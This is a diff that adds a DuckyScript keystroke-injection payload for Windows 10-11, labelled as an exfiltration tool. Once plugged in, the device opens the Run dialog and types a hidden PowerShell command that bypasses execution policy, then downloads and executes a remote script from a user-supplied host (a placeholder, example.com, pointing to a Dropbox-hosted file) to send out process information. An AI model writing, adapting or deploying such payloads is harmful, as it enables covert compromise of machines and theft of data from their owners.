@@ -1,0 +1,26 @@
+REM ##########################################
+REM #                                        |
+REM # Title        : Exfiltrate Process Info |
+REM # Author       : Aleff                   |
+REM # Version      : 1.0                     |
+REM # Category     : Exfiltration            |
+REM # Target       : Windows 10-11           |
+REM #                                        |
+REM ##########################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Webhook
+
+REM REQUIRED - Reply example.com with YOUR LINK. The Payload should be ExfiltrateProcessInfo.ps1
+DEFINE PAYLOAD example.com
+
+
+DELAY 2000
+GUI r
+DELAY 250
+DELETE
+STRING powershell -w h -ep bypass irm 
+STRING PAYLOAD 
+STRING | iex
+ENTER
